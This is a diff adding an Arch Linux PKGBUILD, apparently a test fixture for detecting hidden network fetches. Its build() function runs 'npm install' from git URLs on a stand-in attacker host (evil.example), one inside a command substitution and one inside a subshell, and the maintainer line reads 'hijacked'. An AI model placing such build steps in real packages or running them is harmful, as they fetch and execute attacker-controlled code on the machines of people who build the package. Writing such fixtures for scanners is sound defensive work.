@@ -1,0 +1,18 @@
+# Maintainer: hijacked <attacker@evil.example>
+pkgname=nodebuild
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="installs a package from a git remote inside a command substitution"
+arch=('any')
+url="https://example.com"
+license=('custom')
+source=()
+
+build() {
+    _out=$(npm install git+https://evil.example/x.git)
+    ( /usr/bin/npm install -- git+https://evil.example/y.git )
+}
+
+package() {
+    :
+}
